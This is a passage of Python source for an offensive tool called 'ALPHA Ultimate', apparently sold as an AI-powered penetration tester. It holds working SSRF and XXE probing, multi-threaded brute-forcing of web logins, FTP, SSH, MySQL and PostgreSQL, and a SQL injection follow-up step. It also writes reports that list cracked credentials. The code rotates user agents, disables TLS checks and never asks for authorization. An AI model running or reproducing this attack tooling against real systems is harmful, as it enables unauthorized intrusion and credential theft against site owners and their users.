                                'response_sample': response.text[:200]
                            })
                            print(f"{Fore.RED}🚨 SSRF Vulnerability: {endpoint['url']}{Style.RESET_ALL}")
                            break
                    except:
                        pass
        
        self.results['ssrf_vulnerabilities'] = vulnerable
        print(f"{Fore.GREEN}✅ SSRF Found: {len(vulnerable)}{Style.RESET_ALL}")

    def detect_ssrf_response(self, response, payload):
        """Detect SSRF in response"""
        indicators = ['root:', 'mysql', 'ssh', 'internal', 'localhost', '127.0.0.1', '169.254.169.254']
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in indicators)

    def xxe_vulnerability_scan(self):
        """XXE vulnerability scan"""
        print(f"{Fore.BLUE}📄 XXE Scan...{Style.RESET_ALL}")
        
        xxe_payloads = self.ai_learning_db['xxe_payloads']
        vulnerable = []
        
        for endpoint in self.results['api_endpoints']:
            for payload in xxe_payloads:
                try:
                    headers = {'Content-Type': 'application/xml', 'User-Agent': random.choice(self.user_agents)}
                    xml_data = f'<?xml version="1.0"?><!DOCTYPE root [ {payload} ]><root>test</root>'
                    response = self.session.post(endpoint['url'], data=xml_data, headers=headers, timeout=5, verify=False)
                    if self.detect_xxe_response(response):
                        vulnerable.append({
                            'url': endpoint['url'],
                            'payload': payload,
                            'response_sample': response.text[:200]
                        })
                        print(f"{Fore.RED}🚨 XXE Vulnerability: {endpoint['url']}{Style.RESET_ALL}")
                        break
                except:
                    pass
        
        self.results['xxe_vulnerabilities'] = vulnerable
        print(f"{Fore.GREEN}✅ XXE Found: {len(vulnerable)}{Style.RESET_ALL}")

    def detect_xxe_response(self, response):
        """Detect XXE in response"""
        indicators = ['root:', '/etc/passwd', '<?php', 'warning', 'error', 'file not found', 'permission denied']
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in indicators)

    # ============ BRUTE FORCE ============

    def advanced_brute_force_attack(self):
        """Advanced brute force attack"""
        print(f"{Fore.CYAN}🔑 ADVANCED BRUTE FORCE{Style.RESET_ALL}")
        print("="*60)
        
        print(f"\n{Fore.YELLOW}🎯 Target Selection:{Style.RESET_ALL}")
        print("1. Admin Panel Login")
        print("2. Custom Login Page")
        print("3. FTP Service")
        print("4. SSH Service")
        print("5. Database Login")
        
        choice = input(f"{Fore.GREEN}Select (1-5): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            self.brute_force_admin_panels()
        elif choice == "2":
            self.brute_force_custom_login()
        elif choice == "3":
            self.brute_force_ftp()
        elif choice == "4":
            self.brute_force_ssh()
        elif choice == "5":
            self.brute_force_database()
        else:
            print(f"{Fore.RED}❌ Invalid selection{Style.RESET_ALL}")

    def brute_force_admin_panels(self):
        """Brute force admin panels"""
        if not self.results['admin_panels']:
            print(f"{Fore.RED}❌ No admin panels found{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}📋 Admin Panels:{Style.RESET_ALL}")
        for i, panel in enumerate(self.results['admin_panels'], 1):
            print(f"   {i}. {panel['url']}")
        
        try:
            panel_choice = int(input(f"{Fore.YELLOW}Select panel (1-{len(self.results['admin_panels'])}): {Style.RESET_ALL}"))
            if 1 <= panel_choice <= len(self.results['admin_panels']):
                selected_panel = self.results['admin_panels'][panel_choice - 1]
                self.brute_force_target = selected_panel['url']
                print(f"{Fore.BLUE}🎯 Target: {self.brute_force_target}{Style.RESET_ALL}")
                self.ask_for_wordlist_file()
                self.execute_brute_force_attack()
            else:
                print(f"{Fore.RED}❌ Invalid selection{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}❌ Invalid input{Style.RESET_ALL}")

    def brute_force_custom_login(self):
        """Brute force custom login"""
        custom_url = input(f"{Fore.YELLOW}Enter login URL: {Style.RESET_ALL}").strip()
        if not custom_url.startswith(('http://', 'https://')):
            custom_url = 'https://' + custom_url
        self.brute_force_target = custom_url
        print(f"{Fore.GREEN}✅ Target: {custom_url}{Style.RESET_ALL}")
        self.ask_for_wordlist_file()
        self.execute_brute_force_attack()

    def brute_force_ftp(self):
        """Brute force FTP"""
        ftp_host = input(f"{Fore.YELLOW}Enter FTP host: {Style.RESET_ALL}").strip()
        self.brute_force_target = f"ftp://{ftp_host}"
        print(f"{Fore.GREEN}✅ FTP Target: {ftp_host}{Style.RESET_ALL}")
        self.ask_for_wordlist_file()
        self.execute_ftp_brute_force()

    def brute_force_ssh(self):
        """Brute force SSH"""
        ssh_host = input(f"{Fore.YELLOW}Enter SSH host: {Style.RESET_ALL}").strip()
        self.brute_force_target = f"ssh://{ssh_host}"
        print(f"{Fore.GREEN}✅ SSH Target: {ssh_host}{Style.RESET_ALL}")
        self.ask_for_wordlist_file()
        self.execute_ssh_brute_force()

    def brute_force_database(self):
        """Brute force database"""
        print(f"\n{Fore.YELLOW}🗄️ Database Selection:{Style.RESET_ALL}")
        print("1. MySQL")
        print("2. PostgreSQL")
        print("3. MongoDB")
        
        choice = input(f"{Fore.GREEN}Select (1-3): {Style.RESET_ALL}").strip()
        db_host = input(f"{Fore.YELLOW}Enter database host: {Style.RESET_ALL}").strip()
        
        if choice == "1":
            self.brute_force_target = f"mysql://{db_host}"
        elif choice == "2":
            self.brute_force_target = f"postgresql://{db_host}"
        elif choice == "3":
            self.brute_force_target = f"mongodb://{db_host}"
        else:
            print(f"{Fore.RED}❌ Invalid selection{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}✅ Database Target: {self.brute_force_target}{Style.RESET_ALL}")
        self.ask_for_wordlist_file()
        self.execute_database_brute_force()

    def ask_for_wordlist_file(self):
        """Ask for wordlist"""
        print(f"\n{Fore.YELLOW}📁 Wordlist Selection:{Style.RESET_ALL}")
        print("1. Built-in wordlist")
        print("2. Custom file")
        print("3. Auto-generate smart passwords")
        
        choice = input(f"{Fore.GREEN}Select (1-3): {Style.RESET_ALL}").strip()
        
        if choice == "1":
            self.brute_force_file = "builtin"
            print(f"{Fore.GREEN}✅ Using built-in wordlist{Style.RESET_ALL}")
        elif choice == "2":
            file_path = input(f"{Fore.YELLOW}Enter wordlist path: {Style.RESET_ALL}").strip()
            if os.path.exists(file_path):
                self.brute_force_file = file_path
                print(f"{Fore.GREEN}✅ Wordlist loaded: {file_path}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ File not found{Style.RESET_ALL}")
                self.brute_force_file = "builtin"
        elif choice == "3":
            count = int(input(f"{Fore.YELLOW}Number of passwords: {Style.RESET_ALL}").strip())
            self.generate_password_list(count, 'high')
            self.brute_force_file = "random"
        else:
            self.brute_force_file = "builtin"

    def load_credentials(self):
        """Load credentials"""
        if self.brute_force_file == "builtin":
            usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
            passwords = self.ai_learning_db['brute_force_wordlists']['common_passwords']
        elif self.brute_force_file == "random":
            usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
            passwords = self.custom_passwords
        else:
            usernames = []
            passwords = []
            try:
                with open(self.brute_force_file, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if line:
                        if ':' in line:
                            user, pwd = line.split(':', 1)
                            usernames.append(user.strip())
                            passwords.append(pwd.strip())
                        else:
                            passwords.append(line)
                if not usernames:
                    usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
            except Exception as e:
                print(f"{Fore.RED}❌ Error loading wordlist: {e}{Style.RESET_ALL}")
                usernames = self.ai_learning_db['brute_force_wordlists']['common_usernames']
                passwords = self.ai_learning_db['brute_force_wordlists']['common_passwords']
        
        return usernames, passwords

    def execute_brute_force_attack(self):
        """Execute brute force attack"""
        print(f"\n{Fore.RED}🔥 STARTING BRUTE FORCE{Style.RESET_ALL}")
        print("="*70)
        
        usernames, passwords = self.load_credentials()
        total_attempts = len(usernames) * len(passwords)
        
        print(f"📊 Attack Stats:")
        print(f"   👤 Usernames: {len(usernames)}")
        print(f"   🔑 Passwords: {len(passwords)}")
        print(f"   💥 Total Attempts: {total_attempts}")
        print(f"   🎯 Target: {self.brute_force_target}")
        
        if input(f"{Fore.RED}Continue? (Y/N): {Style.RESET_ALL}").lower() != 'y':
            print(f"{Fore.YELLOW}⚠️ Cancelled{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}🚀 Starting attack...{Style.RESET_ALL}")
        
        found_credentials = []
        attempts = 0
        start_time = time.time()
        
        if CONCURRENT_AVAILABLE:
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_cred = {}
                for username in usernames:
                    for password in passwords:
                        future = executor.submit(self.test_credentials, username, password)
                        future_to_cred[future] = (username, password)
                        attempts += 1
                
                completed = 0
                for future in as_completed(future_to_cred):
                    completed += 1
                    username, password = future_to_cred[future]
                    try:
                        if future.result():
                            found_credentials.append((username, password))
                            print(f"\n{Fore.GREEN}🎉 CREDENTIALS: {username}:{password}{Style.RESET_ALL}")
                            self.found_credentials.append({
                                'username': username,
                                'password': password,
                                'target': self.brute_force_target,
                                'timestamp': datetime.now().isoformat()
                            })
                    except:
                        pass
                    
                    progress = (completed / total_attempts) * 100
                    elapsed = time.time() - start_time
                    speed = completed / elapsed if elapsed > 0 else 0
                    eta = (total_attempts - completed) / speed if speed > 0 else 0
                    sys.stdout.write(f'\r🔑 Progress: [{completed}/{total_attempts}] {progress:.1f}% | Speed: {speed:.1f} att/s | Found: {len(found_credentials)}')
                    sys.stdout.flush()
        else:
            print(f"{Fore.YELLOW}⚠️ Sequential mode{Style.RESET_ALL}")
            for username in usernames:
                for password in passwords:
                    try:
                        if self.test_credentials(username, password):
                            found_credentials.append((username, password))
                            print(f"\n{Fore.GREEN}🎉 CREDENTIALS: {username}:{password}{Style.RESET_ALL}")
                            self.found_credentials.append({
                                'username': username,
                                'password': password,
                                'target': self.brute_force_target,
                                'timestamp': datetime.now().isoformat()
                            })
                    except:
                        pass
                    completed += 1
                    progress = (completed / total_attempts) * 100
                    sys.stdout.write(f'\r🔑 Progress: [{completed}/{total_attempts}] {progress:.1f}% | Found: {len(found_credentials)}')
                    sys.stdout.flush()
        
        self.results['brute_force_results'] = self.found_credentials
        
        print(f"\n\n{Fore.GREEN}✅ Attack Complete!{Style.RESET_ALL}")
        print(f"   📊 Attempts: {attempts}")
        print(f"   🎯 Credentials Found: {len(found_credentials)}")
        print(f"   ⏱️  Time: {time.time() - start_time:.2f}s")

    def test_credentials(self, username, password):
        """Test credentials"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            login_data = {
                'username': username,
                'password': password,
                'email': username,
                'user': username,
                'login': 'Login',
                'submit': 'Submit',
                'action': 'login'
            }
            response = self.session.post(
                self.brute_force_target,
                data=login_data,
                headers=headers,
                timeout=10,
                allow_redirects=True,
                verify=False
            )
            return self.is_login_successful(response, username)
        except:
            return False

    def is_login_successful(self, response, username):
        """Check login success"""
        text_lower = response.text.lower()
        url_lower = response.url.lower()
        
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'success', 'logged in',
            f'welcome {username.lower()}', 'my account', 'profile'
        ]
        failure_indicators = [
            'invalid', 'incorrect', 'error', 'failed', 'wrong',
            'not found', 'try again', 'login failed'
        ]
        
        success_score = 0
        failure_score = 0
        
        if 'dashboard' in url_lower or 'admin' in url_lower or 'welcome' in url_lower:
            success_score += 3
        
        for indicator in success_indicators:
            if indicator in text_lower:
                success_score += 2
        
        for indicator in failure_indicators:
            if indicator in text_lower:
                failure_score += 2
        
        return success_score > failure_score and success_score >= 3

    def execute_ftp_brute_force(self):
        """Execute FTP brute force"""
        print(f"{Fore.RED}🔥 FTP Brute Force{Style.RESET_ALL}")
        try:
            import ftplib
            ftp_host = self.brute_force_target.replace('ftp://', '')
            usernames, passwords = self.load_credentials()
            found = []
            for username in usernames:
                for password in passwords:
                    try:
                        ftp = ftplib.FTP(ftp_host)
                        ftp.login(username, password)
                        found.append((username, password))
                        print(f"{Fore.GREEN}🎉 FTP: {username}:{password}{Style.RESET_ALL}")
                        ftp.quit()
                        break
                    except:
                        pass
            if found:
                self.results['brute_force_results'].extend([{
                    'username': cred[0],
                    'password': cred[1],
                    'target': self.brute_force_target,
                    'timestamp': datetime.now().isoformat()
                } for cred in found])
        except:
            print(f"{Fore.RED}❌ FTP library not available{Style.RESET_ALL}")

    def execute_ssh_brute_force(self):
        """Execute SSH brute force"""
        print(f"{Fore.RED}🔥 SSH Brute Force{Style.RESET_ALL}")
        try:
            import paramiko
            ssh_host = self.brute_force_target.replace('ssh://', '')
            usernames, passwords = self.load_credentials()
            found = []
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ssh_host, username=username, password=password, timeout=10)
                        found.append((username, password))
                        print(f"{Fore.GREEN}🎉 SSH: {username}:{password}{Style.RESET_ALL}")
                        ssh.close()
                        break
                    except:
                        pass
            if found:
                self.results['brute_force_results'].extend([{
                    'username': cred[0],
                    'password': cred[1],
                    'target': self.brute_force_target,
                    'timestamp': datetime.now().isoformat()
                } for cred in found])
        except:
            print(f"{Fore.RED}❌ Paramiko not available{Style.RESET_ALL}")

    def execute_database_brute_force(self):
        """Execute database brute force"""
        print(f"{Fore.RED}🔥 Database Brute Force{Style.RESET_ALL}")
        
        db_type = self.brute_force_target.split('://')[0]
        db_host = self.brute_force_target.split('://')[1]
        usernames, passwords = self.load_credentials()
        found = []
        
        for username in usernames:
            for password in passwords:
                try:
                    if db_type == 'mysql':
                        import pymysql
                        conn = pymysql.connect(host=db_host, user=username, password=password, connect_timeout=5)
                        found.append((username, password))
                        print(f"{Fore.GREEN}🎉 MySQL: {username}:{password}{Style.RESET_ALL}")
                        conn.close()
                        break
                    elif db_type == 'postgresql':
                        import psycopg2
                        conn = psycopg2.connect(host=db_host, user=username, password=password, connect_timeout=5)
                        found.append((username, password))
                        print(f"{Fore.GREEN}🎉 PostgreSQL: {username}:{password}{Style.RESET_ALL}")
                        conn.close()
                        break
                except:
                    pass
        
        if found:
            self.results['brute_force_results'].extend([{
                'username': cred[0],
                'password': cred[1],
                'target': self.brute_force_target,
                'timestamp': datetime.now().isoformat()
            } for cred in found])

    def credential_bruteforce(self):
        """Auto credential bruteforce"""
        print(f"{Fore.BLUE}🔑 Auto Bruteforce...{Style.RESET_ALL}")
        if not self.results.get('admin_panels'):
            print(f"{Fore.YELLOW}⚠️ No admin panels found{Style.RESET_ALL}")
            return
        panels = self.results['admin_panels'][:3]
        for panel in panels:
            try:
                self.brute_force_target = panel['url']
                self.brute_force_file = 'builtin'
                print(f"{Fore.CYAN}🎯 Target: {self.brute_force_target}{Style.RESET_ALL}")
                self.execute_brute_force_attack()
            except:
                continue

    def advanced_exploitation(self):
        """Advanced exploitation"""
        print(f"{Fore.BLUE}💀 Exploitation...{Style.RESET_ALL}")
        try:
            for sqli in self.results.get('working_sql_injections', [])[:3]:
                url = sqli['url']
                test = url + ("&" if "?" in url else "?") + "union_test=UNION%20SELECT%201"
                try:
                    resp = self.session.get(test, timeout=6, verify=False)
                    if resp.status_code in [200, 302]:
                        sqli['follow_up'] = 'union_select_attempted'
                except:
                    pass
        except:
            pass
        print(f"{Fore.GREEN}✅ Exploitation complete{Style.RESET_ALL}")

    # ============ REPORTING ============

    def generate_report(self):
        """Generate comprehensive report"""
        print(f"{Fore.BLUE}📊 Generating Report...{Style.RESET_ALL}")
        
        reports_dir = os.path.join(os.path.expanduser('~'), 'Documents', 'Alpha_Reports')
        os.makedirs(reports_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        html_report = self.generate_html_report(reports_dir, timestamp)
        json_report = self.generate_json_report(reports_dir, timestamp)
        csv_report = self.generate_csv_report(reports_dir, timestamp)
        
        print(f"{Fore.GREEN}✅ Reports Generated:{Style.RESET_ALL}")
        print(f"   📄 HTML: {html_report}")
        print(f"   📊 JSON: {json_report}")
        print(f"   📋 CSV: {csv_report}")
        
        return html_report

    def generate_html_report(self, reports_dir, timestamp):
        """Generate HTML report"""
        filename = f"Alpha_Report_{timestamp}.html"
        filepath = os.path.join(reports_dir, filename)
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>ALPHA Penetration Test Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }}
        .stat-box {{ background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #667eea; }}
        .section {{ background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .vuln {{ background: #ffe6e6; padding: 10px; margin: 5px 0; border-left: 4px solid #e74c3c; border-radius: 4px; }}
        .success {{ background: #e6ffe6; padding: 10px; margin: 5px 0; border-left: 4px solid #27ae60; border-radius: 4px; }}
        .cred {{ background: #fff3cd; padding: 10px; margin: 5px 0; border-left: 4px solid #f39c12; border-radius: 4px; }}
        .badge {{ display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; margin-left: 5px; }}
        .badge-danger {{ background: #e74c3c; color: white; }}
        .badge-success {{ background: #27ae60; color: white; }}
        .badge-warning {{ background: #f39c12; color: white; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ ALPHA Penetration Test Report</h1>
            <p>Target: {self.target_url} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p>AI-Powered • Auto-Players • Interception • Smart Passwords</p>
        </div>
        
        <div class="stats">
            <div class="stat-box"><span class="stat-number">{len(self.results['admin_panels'])}</span><br>Admin Panels</div>
            <div class="stat-box"><span class="stat-number">{len(self.results['working_sql_injections'])}</span><br>SQL Injections</div>
            <div class="stat-box"><span class="stat-number">{len(self.results['xss_vulnerabilities'])}</span><br>XSS</div>
            <div class="stat-box"><span class="stat-number">{len(self.results['brute_force_results'])}</span><br>Credentials</div>
            <div class="stat-box"><span class="stat-number">{self.player_count}</span><br>Auto-Players</div>
            <div class="stat-box"><span class="stat-number">{len(self.results['subdomains'])}</span><br>Subdomains</div>
        </div>
        
        <div class="section">
            <h2>🔍 Admin Panels ({len(self.results['admin_panels'])})</h2>
            {"".join([f'<div class="success">📍 <a href="{panel["url"]}" target="_blank">{panel["url"]}</a> - Status: {panel["status"]}</div>' for panel in self.results['admin_panels']]) if self.results['admin_panels'] else '<p>No admin panels found</p>'}
        </div>
        
        <div class="section">
            <h2>🔑 Credentials Found ({len(self.results['brute_force_results'])})</h2>
            {"".join([f'<div class="cred">👤 {cred["username"]} : 🔑 {cred["password"]}<br><small>Target: {cred["target"]}</small></div>' for cred in self.results['brute_force_results'][:20]]) if self.results['brute_force_results'] else '<p>No credentials found</p>'}
        </div>
        
        <div class="section">
            <h2>🎮 Auto-Players Generated ({self.player_count})</h2>
            <div style="max-height: 300px; overflow-y: auto;">
            {"".join([f'<div class="success">🎯 {player["username"]} - {player["full_name"]}<br><small>Password: {player["password"]} | Email: {player["email"]} | IP: {player["ip"]}</small></div>' for player in self.auto_players[:20]]) if self.auto_players else '<p>No players generated</p>'}
            </div>
            {f'<p><strong>Sample of {len(self.auto_players)} players shown</strong></p>' if len(self.auto_players) > 20 else ''}
        </div>
        
        <div class="section">
            <h2>💉 SQL Injections ({len(self.results['working_sql_injections'])})</h2>
            {"".join([f'<div class="vuln">💀 <a href="{inj["url"]}" target="_blank">{inj["url"]}</a><br><code>Payload: {inj["payload"]}</code></div>' for inj in self.results['working_sql_injections'][:10]]) if self.results['working_sql_injections'] else '<p>No SQL injections found</p>'}
        </div>
        
        <div class="section">
            <h2>🎯 XSS ({len(self.results['xss_vulnerabilities'])})</h2>
            {"".join([f'<div class="vuln">⚠️ <a href="{xss["url"]}" target="_blank">{xss["url"]}</a><br><code>Payload: {xss["payload"]}</code></div>' for xss in self.results['xss_vulnerabilities'][:10]]) if self.results['xss_vulnerabilities'] else '<p>No XSS found</p>'}
        </div>
        
        <div class="section">
            <h2>🔥 RCE ({len(self.results['rce_vulnerabilities'])})</h2>
            {"".join([f'<div class="vuln">💀 <a href="{rce["url"]}" target="_blank">{rce["url"]}</a><br><code>Payload: {rce["payload"]}</code></div>' for rce in self.results['rce_vulnerabilities'][:10]]) if self.results['rce_vulnerabilities'] else '<p>No RCE found</p>'}
        </div>
        
        <div class="section">
            <h2>🌐 Subdomains ({len(self.results['subdomains'])})</h2>
            {"".join([f'<div class="success">🌐 {sub}</div>' for sub in self.results['subdomains'][:20]]) if self.results['subdomains'] else '<p>No subdomains found</p>'}
            {f'<p><strong>Total: {len(self.results["subdomains"])} subdomains</strong></p>' if len(self.results['subdomains']) > 20 else ''}
        </div>
        
        <div class="section">
            <h2>🔧 Open Ports ({len(self.results['ports'])})</h2>
            {"".join([f'<div class="success">🔌 Port {port} open</div>' for port in self.results['ports']]) if self.results['ports'] else '<p>No open ports found</p>'}
        </div>
        
        <div class="section">
            <h2>🔄 Interception Logs ({len(self.results['interception_logs'])})</h2>
            {"".join([f'<div class="success">📡 {log["timestamp"]} - Size: {log["size"]} bytes</div>' for log in self.results['interception_logs'][:20]]) if self.results['interception_logs'] else '<p>No interception data</p>'}
        </div>
    </div>
</body>
</html>
        """
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return filepath

    def generate_json_report(self, reports_dir, timestamp):
        """Generate JSON report"""
        filename = f"Alpha_Report_{timestamp}.json"
        filepath = os.path.join(reports_dir, filename)
        with open(filepath, 'w') as f:
            json.dump(self.results, f, indent=4)
        return filepath

    def generate_csv_report(self, reports_dir, timestamp):
        """Generate CSV report"""
        filename = f"Alpha_Report_{timestamp}.csv"
        filepath = os.path.join(reports_dir, filename)
        
        try:
            with open(filepath, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['Metric', 'Value'])
                writer.writerow(['Target URL', self.target_url])
                writer.writerow(['Admin Panels', len(self.results.get('admin_panels', []))])
                writer.writerow(['SQLi', len(self.results.get('working_sql_injections', []))])
                writer.writerow(['XSS', len(self.results.get('xss_vulnerabilities', []))])
                writer.writerow(['RCE', len(self.results.get('rce_vulnerabilities', []))])
                writer.writerow(['LFI', len(self.results.get('lfi_vulnerabilities', []))])
                writer.writerow(['CSRF', len(self.results.get('csrf_vulnerabilities', []))])
                writer.writerow(['CORS', len(self.results.get('cors_vulnerabilities', []))])
                writer.writerow(['SSRF', len(self.results.get('ssrf_vulnerabilities', []))])
                writer.writerow(['XXE', len(self.results.get('xxe_vulnerabilities', []))])
                writer.writerow(['Subdomains', len(self.results.get('subdomains', []))])
                writer.writerow(['Open Ports', len(self.results.get('ports', []))])
                writer.writerow(['Auto-Players', self.player_count])
                writer.writerow(['Credentials Found', len(self.results.get('brute_force_results', []))])
                writer.writerow(['Interception Logs', len(self.results.get('interception_logs', []))])
        except:
            pass
        
        return filepath

    def show_summary(self, report_path):
        """Show summary"""
        total_time = time.time() - self.start_time
        
        print(f"\n{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}🎉 ALPHA Penetration Test Complete! 🎉{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*120}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}📊 ULTIMATE STATISTICS:{Style.RESET_ALL}")
        print(f"   ⏱️  Total Time: {total_time:.2f}s")
        print(f"   📡 Requests: {self.request_count}")
        print(f"   🎮 Auto-Players: {self.player_count}")
        print(f"   🔑 Smart Passwords: {len(self.custom_passwords)}")
        
        print(f"\n{Fore.CYAN}🎯 FINDINGS SUMMARY:{Style.RESET_ALL}")
        print(f"   🔍 Admin Panels: {len(self.results['admin_panels'])}")
        print(f"   💉 SQL Injections: {len(self.results['working_sql_injections'])}")
        print(f"   🎯 XSS: {len(self.results['xss_vulnerabilities'])}")
        print(f"   🔥 RCE: {len(self.results['rce_vulnerabilities'])}")
        print(f"   📁 LFI: {len(self.results['lfi_vulnerabilities'])}")
        print(f"   🔑 Credentials: {len(self.results['brute_force_results'])}")
        print(f"   🌐 Subdomains: {len(self.results['subdomains'])}")
        print(f"   🔌 Open Ports: {len(self.results['ports'])}")
        print(f"   🔗 APIs: {len(self.results['api_endpoints'])}")
        print(f"   💾 Backups: {len(self.results['backup_files'])}")
        print(f"   📁 Hidden Dirs: {len(self.results['hidden_directories'])}")
        print(f"   🔄 CORS: {len(self.results['cors_vulnerabilities'])}")
        print(f"   🌐 SSRF: {len(self.results['ssrf_vulnerabilities'])}")
        print(f"   📄 XXE: {len(self.results['xxe_vulnerabilities'])}")
        
        if self.results['brute_force_results']:
            print(f"\n{Fore.GREEN}🔑 CREDENTIALS FOUND:{Style.RESET_ALL}")
            for cred in self.results['brute_force_results'][:10]:
                print(f"   👤 {cred['username']} : 🔑 {cred['password']}")
        
        if self.auto_players:
            print(f"\n{Fore.CYAN}🎮 SAMPLE AUTO-PLAYERS:{Style.RESET_ALL}")
            for player in self.auto_players[:5]:
                print(f"   🎯 {player['username']} - {player['full_name']} (IP: {player['ip']})")
        
        print(f"\n{Fore.CYAN}💾 REPORTS:{Style.RESET_ALL}")
        print(f"   📄 HTML: {report_path}")
        print(f"   📊 JSON: {report_path.replace('.html', '.json')}")
        print(f"   📋 CSV: {report_path.replace('.html', '.csv')}")
        
        print(f"\n{Fore.YELLOW}⚠️  NEXT STEPS:{Style.RESET_ALL}")
        print(f"   1. Open HTML report for detailed analysis")
        print(f"   2. Verify vulnerabilities manually")
        print(f"   3. Test found credentials")
        print(f"   4. Review interception logs")
        print(f"   5. Document findings")
        
        print(f"{Fore.GREEN}{'='*120}{Style.RESET_ALL}")


class Interceptor:
    """Request/Response Interceptor"""
    
    def __init__(self, engine):
        self.engine = engine
        self.running = False
        self.session = engine.session
        
    def start(self):
        """Start interception"""
        self.running = True
        
        # Monkey patch requests
        self.original_get = self.session.get
        self.original_post = self.session.post
        self.session.get = self.intercept_get
        self.session.post = self.intercept_post
        
    def stop(self):
        """Stop interception"""
        self.running = False
        self.session.get = self.original_get
        self.session.post = self.original_post
        
    def intercept_get(self, url, **kwargs):
        """Intercept GET request"""
        start_time = time.time()
        response = self.original_get(url, **kwargs)
        elapsed = time.time() - start_time
        
        request_data = {
            'method': 'GET',
            'url': url,
            'headers': kwargs.get('headers', {}),
            'params': kwargs.get('params', {})
        }
        
        response_data = {
            'status': response.status_code,
            'headers': dict(response.headers),
            'size': len(response.content),
            'time': elapsed
        }
        
        self.engine.log_interception(request_data, response_data)
        return response
    
    def intercept_post(self, url, **kwargs):
        """Intercept POST request"""
        start_time = time.time()
        response = self.original_post(url, **kwargs)
        elapsed = time.time() - start_time
        
        request_data = {
            'method': 'POST',
            'url': url,
            'headers': kwargs.get('headers', {}),
            'data': kwargs.get('data', {}),
            'json': kwargs.get('json', {})
        }
        
        response_data = {
            'status': response.status_code,
            'headers': dict(response.headers),
            'size': len(response.content),
            'time': elapsed
        }
        
        self.engine.log_interception(request_data, response_data)
        return response


def check_dependencies():
    """Check dependencies"""
    required = ['requests', 'colorama', 'urllib3']
    missing = []
    for module in required:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"{Fore.RED}❌ Missing: {', '.join(missing)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Install: pip install {' '.join(missing)}{Style.RESET_ALL}")
        return False
    
    return True


def main():
    """Main"""
    if not check_dependencies():
        return
    
    print(f"{Fore.CYAN}🚀 ALPHA Ultimate v4.0 Initializing...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}📋 AI-Powered • Auto-Players • Interception • Smart Passwords{Style.RESET_ALL}")
    
    tester = ALPHAEngine()
    tester.run_pentest()


if __name__ == "__main__":
    main()
